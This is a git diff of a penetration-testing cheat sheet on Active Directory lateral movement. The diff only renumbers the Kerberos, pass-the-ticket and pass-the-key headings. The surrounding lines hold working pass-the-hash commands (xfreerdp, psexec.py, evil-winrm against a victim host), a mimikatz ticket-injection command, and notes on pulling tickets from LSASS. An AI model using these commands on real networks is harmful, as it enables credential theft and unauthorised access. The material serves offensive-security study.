@@ -172,13 +172,13 @@ xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
 psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
 evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
 ````
-## 6.1 Kerberos:
+## 6.2 Kerberos:
 - **mechanisim**: 
     - 1-user sends his username and a **timestamp encrypted using a key derived from his password** to KDC
     - 2-The KDC will create and send back a TGT,  Along with the TGT, a **Session Key** is given to the use
     - 3-To request a TGS, the user will send his username and a timestamp **encrypted using the Session Key**, along with the TGT and a **SPN**
     - 4-As a result, the KDC will send us a TGS and a **Service Session Key**, and TGS is encrypted using the **Service Owner Hash**
-### Pass-The-Ticket
+### 6.2.1 Pass-The-Ticket
 - **Notes**:
     - Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz
     - Notice that if we only had access to a ticket but not its corresponding session key, we wouldn't be able to use that ticket; therefore, both are necessary.
@@ -193,7 +193,7 @@ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
     #Injecting tickets in our own session doesn't require administrator privileges
     mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-<domainName>.kirbi
     ```
-### Pass-The-Key
+### 6.2.2 Pass-The-Key
 - **Notes**:
     - When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. 
     - If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).
